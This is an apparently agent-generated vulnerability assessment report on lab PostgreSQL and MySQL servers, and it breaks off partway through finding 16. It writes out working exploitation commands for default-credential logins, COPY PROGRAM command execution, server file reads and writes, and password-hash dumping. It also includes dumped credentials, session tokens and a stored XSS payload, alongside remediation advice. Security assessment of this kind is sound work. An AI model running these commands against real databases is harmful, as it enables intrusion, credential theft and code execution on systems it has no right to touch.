# Vulnerability Assessment Report — sql-databases

**Campaign:** camp_20260801_c0151524  
**Specialist agent:** sql-databases  
**Methodology:** ISO 27001 / NIST SP 800-115 / MITRE ATT&CK  
**Note:** assembled from the agent's pushed findings (complete evidence per finding). The compiled server generator could not serve this campaign (stale-reconciler / data-dependent 500 — see e2e notes).

## MANAGEMENT SUMMARY

**Overall posture:** 🔴 CRITICAL — 22 findings (6 critical, 10 high, 6 medium, 0 low).

## 1. FINDINGS TABLE

| # | Title | Severity | Status | CVSS | MITRE |
|---|-------|----------|--------|------|-------|
| 1 | PostgreSQL Superuser Access with Default Credentials (postgres/postgre | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:N/ | T1078.001 |
| 2 | MySQL Root Access with Default Credentials and Password Hash Exposure | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:N/ | T1078.001 |
| 3 | PostgreSQL COPY PROGRAM Remote Code Execution (RCE) as postgres User | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1059.004 |
| 4 | PostgreSQL Sensitive Application Data Exposure (API Keys and User Cred | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1552.001 |
| 5 | MySQL Plaintext Credentials and PII Exposure in vulnapp Database | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1530 |
| 6 | PostgreSQL Arbitrary File Write via COPY TO and lo_export | CRITICAL | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1105 |
| 7 | PostgreSQL Arbitrary File Read via pg_read_file (Server /etc/passwd Ex | HIGH | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1005 |
| 8 | PostgreSQL Password Hash Exposure (SCRAM-SHA-256) via pg_shadow | HIGH | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1003 |
| 9 | MySQL Password Hash Exposure via mysql.user Table | HIGH | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1003 |
| 10 | PostgreSQL Trust Authentication Allows Passwordless Local Access | HIGH | confirmed | CVSS:3.1/AV:L/AC:L/PR:L/ | T1556 |
| 11 | MySQL FILE Privilege Exploitation — Arbitrary File Write and Read via  | HIGH | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1570 |
| 12 | MySQL Active Session Tokens Exposed in Database (Session Hijacking Ris | HIGH | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1539 |
| 13 | PostgreSQL Large Object (lo_import) Arbitrary File Read | HIGH | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1005 |
| 14 | MySQL 5.6 End-of-Life — No Security Updates Available | HIGH | confirmed | CVSS:3.1/AV:N/AC:L/PR:N/ | T1190 |
| 15 | MySQL Root Account Accessible from Any Host (root@%) | HIGH | confirmed | CVSS:3.1/AV:N/AC:L/PR:L/ | T1078 |
| 16 | PostgreSQL dblink Extension Available — Lateral Movement and SSRF Prim | HIGH | confirmed | CVSS:3.1/AV:N/AC:L/PR:L/ | T1210 |
| 17 | PostgreSQL SSL/TLS Disabled — All Connections Unencrypted | MEDIUM | confirmed | CVSS:3.1/AV:N/AC:H/PR:N/ | T1040 |
| 18 | MySQL SSL/TLS Disabled — All Connections Unencrypted | MEDIUM | confirmed | CVSS:3.1/AV:N/AC:H/PR:N/ | T1040 |
| 19 | PostgreSQL Connection and Statement Logging Disabled | MEDIUM | confirmed | CVSS:3.1/AV:N/AC:L/PR:N/ | T1562.002 |
| 20 | MySQL local_infile Enabled — Client-Side File Read Risk | MEDIUM | confirmed | CVSS:3.1/AV:N/AC:L/PR:L/ | T1005 |
| 21 | MySQL Audit and Query Logging Completely Disabled | MEDIUM | confirmed | CVSS:3.1/AV:N/AC:L/PR:N/ | T1562.002 |
| 22 | PostgreSQL Server Environment Variables Exposed via COPY PROGRAM | MEDIUM | exploited | CVSS:3.1/AV:N/AC:L/PR:L/ | T1082 |

## 2. VULNERABILITY DETAILS — ONE SECTION PER FINDING

### 1. [CRITICAL / exploited] PostgreSQL Superuser Access with Default Credentials (postgres/postgres)

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **MITRE ATT&CK:** T1078.001 Valid Accounts: Default Accounts
- **ISO 27001:** A.9.2.3
- **Component:** PostgreSQL Server

**Description**

The PostgreSQL 16.14 instance at 127.0.0.1:5432 is accessible with default credentials postgres/postgres. The postgres user has SUPERUSER, CREATEROLE, CREATEDB, LOGIN, and REPLICATION privileges — full administrative control over the entire database instance. This grants the ability to read/write arbitrary files on the server filesystem, execute operating system commands via COPY PROGRAM, create roles, and access all data.

**Technical Analysis**

The PostgreSQL instance accepts the default credentials postgres/postgres over the network. The postgres role is a SUPERUSER with full administrative control. This was confirmed by successfully connecting and querying pg_roles, which shows rolsuper=t for the postgres role. A superuser can execute arbitrary OS commands via COPY PROGRAM, read/write any file on the server, and access all databases and tables without restriction.

**Exploitation Commands**

```
PGPASSWORD=postgres PGSSLMODE=disable psql -h 127.0.0.1 -p 5432 -U postgres -w -c 'SELECT version();'
PGPASSWORD=postgres PGSSLMODE=disable psql -h 127.0.0.1 -p 5432 -U postgres -w -c 'SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin, rolreplication FROM pg_roles;'
```

**Evidence / Logs**

```
PostgreSQL 16.14 (Debian 16.14-1.pgdg13+1) on x86_64-pc-linux-gnu
postgres role: rolsuper=t, rolcreaterole=t, rolcreatedb=t, rolcanlogin=t, rolreplication=t
```

**Remediation**

1. Change the postgres superuser password to a strong, unique password immediately. 2. Restrict network access using pg_hba.conf to only trusted hosts. 3. Consider creating application-specific roles with minimal privileges instead of using the postgres superuser for application connectivity. 4. Enable SSL/TLS for all connections.

---

### 2. [CRITICAL / exploited] MySQL Root Access with Default Credentials and Password Hash Exposure

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **MITRE ATT&CK:** T1078.001 Valid Accounts: Default Accounts
- **ISO 27001:** A.9.2.3
- **Component:** MySQL Server

**Description**

The MySQL 5.6.51 instance at 172.22.0.2:3306 is accessible with default root credentials (root/rootwolf). The root user has ALL PRIVILEGES ON *.* WITH GRANT OPTION, granting complete administrative control. The root account is exposed on all hosts (root@%) which means it accepts connections from any IP address. The password hash *434F7F33C8D867B699DCE00CB7A0AFC3F18633FC was also exposed in the SHOW GRANTS output.

**Technical Analysis**

The MySQL instance accepts root login with the weak password 'rootwolf' from any host (root@%). The SHOW GRANTS output directly reveals the password hash. The root user has ALL PRIVILEGES WITH GRANT OPTION, allowing full control over all databases, including creating new users, reading/writing files on the filesystem (via FILE privilege), and potentially executing OS commands via UDF loading.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -P 3306 -u root -prootwolf -e 'SELECT user, host FROM mysql.user; SHOW GRANTS FOR CURRENT_USER();'
```

**Evidence / Logs**

```
user=root, host=% (accepts from any IP)
user=root, host=localhost
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY PASSWORD '*434F7F33C8D867B699DCE00CB7A0AFC3F18633FC' WITH GRANT OPTION
```

**Remediation**

1. Change the root password to a strong, unique password. 2. Remove the root@% account and restrict root access to localhost only. 3. Create application-specific users with minimal required privileges. 4. Enable SSL/TLS for all connections. 5. Configure bind-address to restrict network access.

---

### 3. [CRITICAL / exploited] PostgreSQL COPY PROGRAM Remote Code Execution (RCE) as postgres User

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
- **MITRE ATT&CK:** T1059.004 Command and Scripting Interpreter: Unix Shell
- **ISO 27001:** A.12.6.1
- **Component:** PostgreSQL COPY PROGRAM

**Description**

The PostgreSQL superuser postgres can execute arbitrary operating system commands via the COPY ... FROM/TO PROGRAM primitive. This was exploited to execute 'id' on the server, confirming the process runs as uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert). This grants full remote code execution on the underlying host.

**Technical Analysis**

The PostgreSQL COPY ... FROM PROGRAM command allows the superuser to execute arbitrary OS commands and capture their output. By creating a temporary table and copying the output of 'id' into it, we confirmed that commands execute as the postgres system user (uid=999). This is a fully exploited RCE primitive — an attacker with these credentials can execute any command on the database server, read sensitive files, establish reverse shells, or pivot to other systems on the network.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "CREATE TEMP TABLE cmd_output (line text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output;"
```

**Evidence / Logs**

```
COPY 1
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

**Remediation**

1. Revoke superuser privileges from application-facing database roles. 2. Create dedicated application users without pg_execute_server_program membership. 3. Use pg_hba.conf to restrict which hosts can connect as superuser. 4. Consider using PostgreSQL's row-level security and restrict COPY command usage. 5. Monitor and alert on COPY PROGRAM usage in query logs.

---

### 4. [CRITICAL / exploited] PostgreSQL Sensitive Application Data Exposure (API Keys and User Credentials)

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
- **MITRE ATT&CK:** T1552.001 Unsecured Credentials: Credentials In Files
- **ISO 27001:** A.8.2.3
- **Component:** Application Database Tables

**Description**

The PostgreSQL database contains two sensitive application tables accessible to the postgres superuser. The 'api_keys' table exposes a Stripe live secret key (sk_live_FAKE123deadbeef), and the 'app_users' table contains user email addresses and bcrypt password hashes. An attacker with database access can extract these credentials and API keys to compromise payment systems and user accounts.

**Technical Analysis**

Two sensitive application tables were discovered in the PostgreSQL public schema. The 'api_keys' table stores a Stripe live API secret key (sk_live_FAKE123deadbeef) in plaintext — if this were a real key, it would grant full access to the payment processing account including the ability to issue refunds, view transaction history, and access customer payment data. The 'app_users' table contains user emails and bcrypt password hashes. Both tables are fully accessible to the postgres superuser with no row-level security or encryption at rest.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c 'SELECT * FROM api_keys;'
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c 'SELECT * FROM app_users;'
```

**Evidence / Logs**

```
api_keys table:
name=stripe, secret=sk_live_FAKE123deadbeef

app_users table:
id=1, email=admin@example.com, password_hash=$2b$10$fakehashadminpwd
```

**Remediation**

1. Encrypt sensitive data at rest using column-level encryption (pgcrypto). 2. Store API keys in a secrets manager (e.g., HashiCorp Vault) rather than in database tables. 3. Implement row-level security policies. 4. Use dedicated database roles with minimal SELECT privileges for application access. 5. Rotate all exposed API keys immediately.

---

### 5. [CRITICAL / exploited] MySQL Plaintext Credentials and PII Exposure in vulnapp Database

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N
- **MITRE ATT&CK:** T1530 Data from Cloud Storage
- **ISO 27001:** A.8.2.3
- **Component:** vulnapp application database

**Description**

The MySQL vulnapp database contains multiple tables storing user credentials in plaintext (not hashed). The 'admins' table stores admin email/password pairs in cleartext (e.g., admin@vulnapp.local/Qwerty1234, gundam@vulnapp.local/RX-78-2). The 'user' table contains user names, emails, ages, and plaintext passwords for multiple users. The 'userdetails' table contains addresses and additional PII. This represents a severe data protection violation.

**Technical Analysis**

The vulnapp database stores all user and admin credentials in plaintext — not hashed, not encrypted. The admins table contains 2 admin accounts with cleartext passwords. The user table contains at least 10 user records with full names, email addresses, ages (PII), and plaintext passwords. The userdetails table contains additional PII including addresses. Some records also contain evidence of stored XSS payloads injected by previous testers, indicating SQL injection and XSS vulnerabilities in the application layer. All this data is directly accessible to anyone with database credentials.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -P 3306 -u root -prootwolf -e 'SELECT * FROM vulnapp.admins; SELECT * FROM vulnapp.user LIMIT 10; SELECT * FROM vulnapp.userdetails LIMIT 10;'
```

**Evidence / Logs**

```
admins table: adminid=1, mail=admin@vulnapp.local, passwd=Qwerty1234 | adminid=2, mail=gundam@vulnapp.local, passwd=RX-78-2
user table: id=1 Amuro Ray amuro@vulnapp.local passwd=Amuro,Ikima-su! | id=2 Char Aznable char@vulnapp.local passwd=AkaiSuisei | id=4 PentestUser pentest@vulnapp.local passwd=Test1234!
userdetails table: uid=1 address=SIDE-7 | uid=2 address=SIDE-3 | uid=10 address=<script>alert("STORED_XSS_PROFILE")</script>
```

**Remediation**

1. IMMEDIATELY hash all stored passwords using bcrypt or Argon2 — never store plaintext credentials. 2. Encrypt PII columns at rest. 3. Implement column-level access controls. 4. Sanitize all user inputs to prevent stored XSS and SQL injection. 5. Implement data classification and handling policies per GDPR/data protection regulations.

---

### 6. [CRITICAL / exploited] PostgreSQL Arbitrary File Write via COPY TO and lo_export

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **MITRE ATT&CK:** T1105 Ingress Tool Transfer
- **ISO 27001:** A.12.6.1
- **Component:** PostgreSQL COPY TO / lo_export

**Description**

The PostgreSQL superuser can write arbitrary files to the server filesystem using two independent methods: (1) COPY table_name TO '/path/file' writes table data to any writable path, and (2) lo_export(oid, '/path/file') exports a large object to any writable path. Both were proven by writing proof files to /tmp/ and reading them back. This enables writing SSH authorized_keys, cron jobs, web shells, or any other file to achieve persistent access or privilege escalation.

**Technical Analysis**

Two independent file write primitives were exploited. The COPY TO method wrote arbitrary data to /tmp/.dm_write_proof, which was verified by reading it back with pg_read_file(). The lo_export method exported a large object (previously imported from /etc/hostname) to /tmp/.dm_lo_proof. Both methods allow writing to any path writable by the postgres system user (uid=999). An attacker could use these primitives to write SSH authorized_keys for persistence, crontab entries for scheduled command execution, or web shells in document roots for web-based backdoor access.

**Exploitation Commands**

```
-- Method 1: COPY TO
CREATE TEMP TABLE file_write_proof (data text); INSERT INTO file_write_proof VALUES ('darkmoon_file_write_proof'); COPY file_write_proof TO '/tmp/.dm_write_proof';
SELECT pg_read_file('/tmp/.dm_write_proof');
-- Method 2: lo_export
SELECT lo_import('/etc/hostname');  -- returns OID 16410
SELECT lo_export(16410, '/tmp/.dm_lo_proof');  -- returns 1 (success)
```

**Evidence / Logs**

```
COPY TO: COPY 1 succeeded
pg_read_file('/tmp/.dm_write_proof') returned: darkmoon_file_write_proof
lo_import('/etc/hostname') returned OID: 16410
lo_export(16410, '/tmp/.dm_lo_proof') returned: 1 (success)
```

**Remediation**

1. Remove superuser privileges from application-facing roles. 2. Do not grant pg_write_server_files to non-administrative roles. 3. Use filesystem permissions to limit the postgres user's write access. 4. Monitor query logs for COPY TO and lo_export usage. 5. Consider using SELinux/AppArmor to confine the PostgreSQL process.

---

### 7. [HIGH / exploited] PostgreSQL Arbitrary File Read via pg_read_file (Server /etc/passwd Exposed)

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **MITRE ATT&CK:** T1005 Data from Local System
- **ISO 27001:** A.8.2.3
- **Component:** PostgreSQL pg_read_file()

**Description**

The PostgreSQL superuser can read arbitrary files from the server filesystem using the pg_read_file() function. This was exploited to read /etc/passwd, exposing all system accounts including the postgres service account (uid=999). This primitive allows reading configuration files, SSH keys, application secrets, and any other file accessible to the postgres system user.

**Technical Analysis**

The pg_read_file() function, available to superusers and members of the pg_read_server_files role, allows reading arbitrary files from the database server's filesystem. By querying SELECT pg_read_file('/etc/passwd', 0, 2000), the full contents of /etc/passwd were retrieved, exposing all system user accounts. This confirms unrestricted server-side file read capability, which could be used to access SSH private keys, application configuration files with credentials, TLS certificates, and other sensitive data.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "SELECT pg_read_file('/etc/passwd', 0, 2000);"
```

**Evidence / Logs**

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
postgres:x:999:999::/var/lib/postgresql:/bin/bash
(19 entries total)
```

**Remediation**

1. Remove superuser privileges from application database roles. 2. Do not grant pg_read_server_files to non-administrative roles. 3. Use file system permissions to limit the postgres OS user's access to sensitive files. 4. Enable query logging to detect pg_read_file usage.

---

### 8. [HIGH / exploited] PostgreSQL Password Hash Exposure (SCRAM-SHA-256) via pg_shadow

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **MITRE ATT&CK:** T1003 OS Credential Dumping
- **ISO 27001:** A.9.4.3
- **Component:** PostgreSQL pg_shadow

**Description**

The postgres superuser can query pg_shadow to extract password hashes for all database roles. The SCRAM-SHA-256 hash for the postgres user was extracted: SCRAM-SHA-256$4096:D3aym8GImSaYq48MYOZfnQ==$[REDACTED]:[REDACTED]. While SCRAM-SHA-256 is more resistant to offline cracking than MD5, the default password 'postgres' makes this trivially crackable.

**Technical Analysis**

The pg_shadow system view contains password hashes for all database roles. As the postgres superuser, the full SCRAM-SHA-256 hash was extracted. Since the password is 'postgres' (a default/trivial credential), this hash is easily crackable using standard password cracking tools. The exposure of password hashes combined with weak default credentials presents a critical security risk, especially if other roles with sensitive privileges use similarly weak passwords.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "SELECT usename, passwd FROM pg_shadow;"
```

**Evidence / Logs**

```
postgres|SCRAM-SHA-256$4096:D3aym8GImSaYq48MYOZfnQ==$[REDACTED]:[REDACTED]
```

**Remediation**

1. Change all database passwords to strong, unique credentials. 2. Use SCRAM-SHA-256 authentication (already in use). 3. Restrict access to pg_shadow/pg_authid by not granting superuser to application roles. 4. Implement password complexity policies.

---

### 9. [HIGH / exploited] MySQL Password Hash Exposure via mysql.user Table

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **MITRE ATT&CK:** T1003 OS Credential Dumping
- **ISO 27001:** A.9.4.3
- **Component:** MySQL Authentication

**Description**

The MySQL native password hashes for all database users are accessible via SELECT from mysql.user. The root user's password hash (*434F7F33C8D867B699DCE00CB7A0AFC3F18633FC) was extracted for both root@localhost and root@%. MySQL 5.6 uses mysql_native_password (SHA1-based) hashing which is susceptible to offline dictionary/rainbow table attacks.

**Technical Analysis**

The mysql.user system table is accessible to the root user and contains password hashes for all MySQL accounts. The SHA1-based mysql_native_password hashes were extracted. These hashes can be attacked offline using tools like hashcat or john with mode 300. Given that the root password is 'rootwolf' (a weak, dictionary-based password), the hash would be cracked almost instantly. The same hash is used for both root@localhost and root@%, confirming the same weak password is used for all root access paths.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -P 3306 -u root -prootwolf -e 'SELECT user, host, password FROM mysql.user;'
```

**Evidence / Logs**

```
root|localhost|*434F7F33C8D867B699DCE00CB7A0AFC3F18633FC
root|%|*434F7F33C8D867B699DCE00CB7A0AFC3F18633FC
```

**Remediation**

1. Change the root password to a strong, unique credential. 2. Upgrade to MySQL 8.0+ which uses caching_sha2_password (SHA-256 based) by default. 3. Restrict SELECT privileges on mysql.user. 4. Remove the root@% account to prevent remote root access.

---

### 10. [HIGH / confirmed] PostgreSQL Trust Authentication Allows Passwordless Local Access

- **CVSS:** CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
- **MITRE ATT&CK:** T1556 Modify Authentication Process
- **ISO 27001:** A.9.4.2
- **Component:** pg_hba.conf

**Description**

The pg_hba.conf configuration uses 'trust' authentication for all local connections (Unix socket and localhost IPv4/IPv6), including replication connections. This means any process running on the database server can connect as ANY PostgreSQL user (including the superuser) without providing a password. Only remote connections from non-localhost addresses require SCRAM-SHA-256 authentication. The listen_addresses is set to '*' (all interfaces), exposing the service broadly.

**Technical Analysis**

The pg_hba.conf file was read using pg_read_file() and reveals that trust authentication is used for ALL local connections — both Unix sockets and TCP connections from localhost (127.0.0.1 and ::1). Trust authentication means no password is required. Any process on the server that can open a TCP connection to localhost:5432 or a Unix socket can connect as ANY user including the superuser. Replication connections also use trust, meaning a local attacker could establish a rogue replica. Only connections from non-localhost IPs require SCRAM-SHA-256 authentication.

**Exploitation Commands**

```
PGPASSWORD=postgres psql -h 127.0.0.1 -p 5432 -U postgres -c "SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');"
```

**Evidence / Logs**

```
local   all   all   trust
host    all   all   127.0.0.1/32   trust
host    all   all   ::1/128   trust
local   replication   all   trust
host    replication   all   127.0.0.1/32   trust
host    replication   all   ::1/128   trust
host    all   all   all   scram-sha-256
```

**Remediation**

1. Replace 'trust' with 'scram-sha-256' for ALL entries in pg_hba.conf. 2. Restrict local connections to specific users and databases rather than 'all'. 3. Restrict replication connections to specific replication-only roles. 4. Change listen_addresses from '*' to specific required interfaces. 5. Reload PostgreSQL configuration after changes.

---

### 11. [HIGH / exploited] MySQL FILE Privilege Exploitation — Arbitrary File Write and Read via INTO OUTFILE/LOAD_FILE

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **MITRE ATT&CK:** T1570 Lateral Tool Transfer
- **ISO 27001:** A.9.2.3
- **Component:** MySQL FILE Privilege

**Description**

The MySQL root user has the FILE privilege which allows writing arbitrary files to and reading files from the server filesystem within the secure_file_priv directory (/var/lib/mysql-files/). This was exploited by writing a proof file using SELECT INTO OUTFILE and reading it back with LOAD_FILE. While secure_file_priv restricts operations to /var/lib/mysql-files/, this still allows data exfiltration to files accessible by other processes and arbitrary file creation within that path.

**Technical Analysis**

The FILE privilege enables the root MySQL user to write arbitrary content to the server filesystem using SELECT INTO OUTFILE and read files using LOAD_FILE(). The secure_file_priv setting restricts this to /var/lib/mysql-files/, which provides some protection against arbitrary path traversal. However, the ability to write files within this directory can be chained with other vulnerabilities (e.g., writable web roots, cron directories) if the restricted directory overlaps with other application paths. The proof file was successfully written and read back, confirming full file I/O capability within the allowed path. LOAD_FILE of /etc/passwd returns NULL due to secure_file_priv restriction.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -u root -prootwolf -e "SHOW VARIABLES LIKE 'secure_file_priv';"
mysql -h 172.22.0.2 -u root -prootwolf -e "SELECT 'darkmoon_proof' INTO OUTFILE '/var/lib/mysql-files/dm_proof.txt';"
mysql -h 172.22.0.2 -u root -prootwolf -e "SELECT LOAD_FILE('/var/lib/mysql-files/dm_proof.txt');"
```

**Evidence / Logs**

```
secure_file_priv=/var/lib/mysql-files/
INTO OUTFILE: succeeded (no error)
LOAD_FILE result: [REDACTED] (hex for 'darkmoon_proof\n')
```

**Remediation**

1. Revoke FILE privilege from the root user and all application users: REVOKE FILE ON *.* FROM 'root'@'%'. 2. Set secure_file_priv to NULL to completely disable file operations if not needed. 3. Create application-specific users without FILE privilege. 4. Monitor for LOAD_FILE and INTO OUTFILE usage in query logs.

---

### 12. [HIGH / exploited] MySQL Active Session Tokens Exposed in Database (Session Hijacking Risk)

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **MITRE ATT&CK:** T1539 Steal Web Session Cookie
- **ISO 27001:** A.9.4.2
- **Component:** vulnapp session management

**Description**

The MySQL vulnapp database stores active user and admin session tokens in plaintext in the 'sessions' and 'adminsessions' tables. User session IDs are Base64-encoded email addresses (e.g., cGVudGVzdEB0ZXN0LmNvbQ== decodes to pentest@test.com). Admin session tokens are 32-character random strings. An attacker with database access can extract these tokens and hijack active user/admin sessions without needing credentials.

**Technical Analysis**

The vulnapp database stores session tokens for both regular users and administrators in separate tables. User sessions use Base64-encoded email addresses as session IDs (a critical design flaw — session tokens should be cryptographically random, not derived from user identifiers). Admin session tokens appear to be random 32-character strings but are stored in plaintext. With 5 active admin sessions and 5 active user sessions, an attacker with database access can immediately hijack any of these sessions by using the extracted tokens in HTTP requests. This bypasses all authentication mechanisms.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -u root -prootwolf -e 'SELECT * FROM vulnapp.sessions LIMIT 5; SELECT * FROM vulnapp.adminsessions LIMIT 5;'
```

**Evidence / Logs**

```
sessions: uid=4 sessionid=cGVudGVzdEB0ZXN0LmNvbQ== | uid=2 sessionid=TVMtMDYtU0BaZW9uLmNvbQ==
adminsessions: adminsid=1 id=VgNnqzNsdACRpdHHQwvUaWsQEFgsZgRR | adminsid=2 id=qcHBwHIPnIdETBOZDdlPzGxYhDqdGFJF (5 active admin sessions)
```

**Remediation**

1. Use cryptographically random session tokens (not Base64 of email). 2. Store only hashed session tokens in the database. 3. Implement session expiration and rotation. 4. Use server-side session stores (Redis/Memcached) with automatic TTL. 5. Restrict database users from accessing session tables directly.

---

### 13. [HIGH / exploited] PostgreSQL Large Object (lo_import) Arbitrary File Read

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
- **MITRE ATT&CK:** T1005 Data from Local System
- **ISO 27001:** A.8.2.3
- **Component:** PostgreSQL Large Objects

**Description**

The PostgreSQL large object subsystem (lo_import/lo_open/loread) provides an alternative arbitrary file read mechanism independent of pg_read_file(). The lo_import() function imports any server-side file as a large object, and loread() reads its contents. This was exploited to read /etc/hostname via lo_import, confirming the host is 'docker-desktop'. This method can bypass pg_read_file size limits and works with binary files.

**Technical Analysis**

The lo_import() function imported the server's /etc/hostname file as a large object (OID 16410). The content was then read using lo_open() and loread(), revealing the hostname 'docker-desktop'. The large object subsystem provides a second file read primitive that works differently from pg_read_file() — it can read binary files, has no built-in size restriction per call, and the imported data persists in the database's pg_largeobject catalog until explicitly deleted. This makes it useful for exfiltrating large binary files (TLS keys, executables, etc.).

**Exploitation Commands**

```
SELECT lo_import('/etc/hostname');  -- Returns OID: 16410
SELECT convert_from(loread(lo_open(16410, 262144), 1000), 'UTF-8');  -- Returns file content
```

**Evidence / Logs**

```
lo_import('/etc/hostname') returned OID: 16410
loread result: docker-desktop
```

**Remediation**

1. Remove superuser and pg_read_server_files privileges from application roles. 2. Monitor for lo_import/lo_export calls in audit logs. 3. Restrict large object creation with appropriate role grants. 4. Clean up orphaned large objects regularly.

---

### 14. [HIGH / confirmed] MySQL 5.6 End-of-Life — No Security Updates Available

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
- **MITRE ATT&CK:** T1190 Exploit Public-Facing Application
- **ISO 27001:** A.12.6.1
- **Component:** MySQL Server 5.6

**Description**

MySQL 5.6.51 reached End of Life (EOL) in February 2021. No security patches, bug fixes, or updates are available for this version. The server is running MySQL Community Server (GPL) 5.6.51 on Linux x86_64. Multiple known CVEs affect MySQL 5.6 that will never be patched, including authentication bypasses, privilege escalation, and denial-of-service vulnerabilities.

**Technical Analysis**

MySQL 5.6 reached its official End of Life in February 2021. The current installed version is 5.6.51, the last release for this branch. Running EOL software means no security patches are available, leaving the system vulnerable to all CVEs discovered after the EOL date. This includes known vulnerabilities in the mysql_native_password authentication mechanism, buffer overflow issues, and privilege escalation flaws. Oracle's MySQL support matrix confirms no further updates will be released for 5.6.x.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -u root -prootwolf -e "SELECT version(); SHOW VARIABLES LIKE 'version%';"
```

**Evidence / Logs**

```
version()=5.6.51
version_comment=MySQL Community Server (GPL)
version_compile_machine=x86_64
version_compile_os=Linux
```

**Remediation**

1. Upgrade to MySQL 8.0+ (current LTS) or 8.4+ immediately. 2. If upgrading MySQL is not immediately possible, migrate to MariaDB 10.11+ as a compatible alternative. 3. Implement network-level controls (firewall rules) to restrict database access until upgrade is complete. 4. Enable SSL (not supported in this build — another reason to upgrade).

---

### 15. [HIGH / confirmed] MySQL Root Account Accessible from Any Host (root@%)

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
- **MITRE ATT&CK:** T1078 Valid Accounts
- **ISO 27001:** A.9.2.3
- **Component:** MySQL User Management

**Description**

The MySQL root account is configured with host='%' (wildcard), allowing root login from ANY IP address on the network. Combined with the weak password 'rootwolf' and ALL PRIVILEGES WITH GRANT OPTION, any system that can reach port 3306 can obtain full administrative access to the database. This violates the principle of least privilege and expands the attack surface significantly.

**Technical Analysis**

The MySQL user table shows two root entries: root@localhost (local access only) and root@% (access from any IP). The root@% account with ALL PRIVILEGES and GRANT OPTION means any machine on the network can connect as root with full administrative capabilities. This was directly exploited from a remote host (the assessment toolbox) to gain full database access, proving the finding. Network segmentation does not fully mitigate this — any compromised host on the same network segment can pivot to the database.

**Exploitation Commands**

```
mysql -h 172.22.0.2 -u root -prootwolf -e "SELECT user, host FROM mysql.user;"
```

**Evidence / Logs**

```
root|localhost
root|%
```

**Remediation**

1. Remove the root@% account: DROP USER 'root'@'%'. 2. Restrict root access to localhost only. 3. Create application-specific users with minimal required privileges and host restrictions. 4. Implement network-level access controls (firewall rules) to restrict access to port 3306.

---

### 16. [HIGH / confirmed] PostgreSQL dblink Extension Available — Lateral Movement and SSRF Primitive

- **CVSS:** CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N
- **MITRE ATT&CK:** T1210 Exploitation of Remote Services
- **ISO 27001:** A.13.1.1
- **Component:** PostgreSQL dblink/postgres_fdw/file_fdw

**Description**

The PostgreSQL dblink extension is available and was successfully installed and used to establish a connection. dblink allows the PostgreSQL server to initiate outbound TCP connections to arbitrary hosts on any port, functioning as an SSRF primitive. It can be used to: (1) pivot to other database servers on the network, (2) scan internal network hosts and ports, (3) exfiltrate data to external systems, (4) connect to other PostgreSQL instances using leaked credentials. Additionally, postgres_fdw and file_fdw extensions are available for similar lateral movement capabilities.

**Technical Analysis**

